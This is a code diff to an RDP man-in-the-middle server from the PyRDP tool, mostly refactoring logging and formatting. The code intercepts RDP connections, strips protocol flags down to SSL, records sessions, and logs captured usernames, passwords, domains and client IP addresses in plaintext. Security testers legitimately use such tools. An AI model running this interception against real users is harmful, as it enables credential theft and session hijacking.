@@ -8,6 +8,7 @@ from twisted.internet import reactor
 from twisted.internet.protocol import ClientFactory
 
 from pyrdp.core.helper_methods import decodeUTF16LE
+from pyrdp.core.logging.log import LOGGER_NAMES
 from pyrdp.core.ssl import ServerTLSContext
 from pyrdp.crypto.crypto import SecuritySettings, RC4CrypterProxy
 from pyrdp.crypto.observer import RC4LoggingObserver
@@ -71,14 +72,13 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         self.serverData = None
         self.rc4RSAKey = RSA.generate(2048)
         self.crypter = RC4CrypterProxy()
-        self.supportedChannels = []
         self.socket = None
-        self.fileHandle = open("out/rdp_replay_{}_{}.pyrdp".format(datetime.datetime.now().strftime('%Y%m%d_%H_%M%S'), random.randint(0, 1000)), "wb")
-        self.log = logging.getLogger("mitm.server.%s" % friendlyName)
-        self.connectionsLog = logging.getLogger("mitm.connections.%s" % friendlyName)
+        self.fileHandle = open("out/rdp_replay_{}_{}.pyrdp".format(datetime.datetime.now().strftime('%Y%m%d_%H-%M-%S'),
+                                                                   random.randint(0, 1000)), "wb")
+        self.log = logging.getLogger(f"{LOGGER_NAMES.MITM_SERVER}.{friendlyName}")
         self.friendlyName = friendlyName
 
-        rc4Log = logging.getLogger("mitm.server.%s.rc4" % friendlyName)
+        rc4Log = logging.getLogger(f"{self.log.name}.rc4")
         self.securitySettings = SecuritySettings(SecuritySettings.Mode.SERVER)
         self.securitySettings.addObserver(self.crypter)
         self.securitySettings.addObserver(RC4LoggingObserver(rc4Log))
@@ -92,7 +92,8 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         self.tpkt = TPKTLayer()
 
         self.x224 = X224Layer()
-        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest, onDisconnectRequest=self.onDisconnectRequest)
+        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest,
+                                 onDisconnectRequest=self.onDisconnectRequest)
 
         self.mcs = MCSLayer()
         self.router = MCSServerRouter(self.mcs, self)
@@ -155,9 +156,6 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         self.clientConnector = reactor.connectTCP(self.targetHost, self.targetPort, self)
 
     def onConnection(self):
-        """
-        :param clientInfo: Tuple containing the ip and port of the connected client.
-        """
         # Connection sequence #0
         clientInfo = self.tcp.transport.client
         self.log.debug("TCP connected from {}:{}".format(clientInfo[0], clientInfo[1]))
@@ -199,7 +197,8 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         # X224 Request
         self.log.debug("Connection Request received")
 
-        # We need to save the original negotiation PDU because Windows will cut the connection if it sees that the requested protocols have changed.
+        # We need to save the original negotiation PDU because Windows will cut the connection if it
+        # sees that the requested protocols have changed.
         parser = RDPNegotiationRequestParser()
         self.originalNegotiationPDU = parser.parse(pdu.payload)
 
@@ -208,13 +207,13 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         else:
             self.log.info("No cookie for this connection %(cookie)s", {"cookie": ""})
 
+        # Only SSL is implemented, so remove other protocol flags
+        chosenProtocols = self.originalNegotiationPDU.requestedProtocols & NegotiationProtocols.SSL \
+            if self.originalNegotiationPDU.requestedProtocols is not None else None
         self.targetNegotiationPDU = RDPNegotiationRequestPDU(
             self.originalNegotiationPDU.cookie,
             self.originalNegotiationPDU.flags,
-
-            # Only SSL is implemented, so remove other protocol flags
-            self.originalNegotiationPDU.requestedProtocols & NegotiationProtocols.SSL if self.originalNegotiationPDU.requestedProtocols is not None else None,
-
+            chosenProtocols,
             self.originalNegotiationPDU.correlationFlags,
             self.originalNegotiationPDU.correlationID,
             self.originalNegotiationPDU.reserved,
@@ -228,10 +227,11 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
 
         parser = RDPNegotiationResponseParser()
         payload = parser.write(RDPNegotiationResponsePDU(0x00, protocols))
-        self.x224.sendConnectionConfirm(payload, source = 0x1234)
+        self.x224.sendConnectionConfirm(payload, source=0x1234)
 
         if self.originalNegotiationPDU.tlsSupported:
-            self.tcp.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName, certificateFileName=self.certificateFileName))
+            self.tcp.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName,
+                                               certificateFileName=self.certificateFileName))
             self.useTLS = True
 
     def onConnectInitial(self, pdu):
@@ -388,7 +388,8 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         :type mcs: MCSLayer
         :param userID: The mcs user that builds the channel
         :param channelID: The channel ID to use to communicate in that channel
-        :return: MCSServerChannel that handles the device redirection virtual channel traffic from the client to the MITM.
+        :return: MCSServerChannel that handles the device redirection virtual channel traffic from
+                 the client to the MITM.
         """
         # Create all necessary layers
         channel = MCSServerChannel(mcs, userID, channelID)
@@ -447,7 +448,8 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
 
     def onConfirmActive(self, pdu):
         # Force RDP server to send bitmap events instead of order events.
-        pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_ORDER].orderFlags = OrderFlag.NEGOTIATEORDERSUPPORT | OrderFlag.ZEROBOUNDSDELTASSUPPORT
+        pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_ORDER].orderFlags = OrderFlag.NEGOTIATEORDERSUPPORT \
+                                                                             | OrderFlag.ZEROBOUNDSDELTASSUPPORT
         pdu.parsedCapabilitySets[CapabilityType.CAPSTYPE_ORDER].orderSupport = b"\x00" * 32
 
         pdu.parsedCapabilitySets[CapabilityType.CAPSETTYPE_MULTIFRAGMENTUPDATE] = MultifragmentUpdateCapability(0)
@@ -472,11 +474,10 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         self.securitySettings.setClientRandom(clientRandom)
 
     # Client Info Packet
-    def onClientInfoReceived(self, data):
+    def onClientInfoReceived(self, data: bytes):
         """
         Called when client info data is received.
         Record the PDU and send it to the MITMClient.
-        :type data: bytes
         """
         pdu = RDPClientInfoParser().parse(data)
 
@@ -486,11 +487,14 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         self.log.info("Client address: %(clientAddress)s", {"clientAddress": clientAddress})
 
         self.log.debug("Client Info received: %(clientInfoPDU)s", {"clientInfoPDU": pdu})
-        self.connectionsLog.info("CLIENT INFO RECEIVED")
-        self.connectionsLog.info("USER: %(username)s", {"username": pdu.username})
-        self.connectionsLog.info("PASSWORD: %(password)s", {"password": pdu.password})
-        self.connectionsLog.info("DOMAIN: %(domain)s", {"domain": pdu.domain})
-
+        hasExtraInfo = pdu.extraInfo is not None
+        self.log.info("CLIENT INFO RECEIVED.\n"
+                      "USER: %(username)s\n"
+                      "PASSWORD: %(password)s\n"
+                      "DOMAIN: %(domain)s\n"
+                      "LOCAL IP ADDR: %(localIpAddress)s",
+                      {"username": pdu.username, "password": pdu.password, "domain": pdu.domain,
+                       "localIpAddress": pdu.extraInfo.clientAddress if hasExtraInfo else None})
         self.recorder.record(pdu, RDPPlayerMessageType.CLIENT_INFO)
         self.client.onClientInfoPDUReceived(pdu)
 
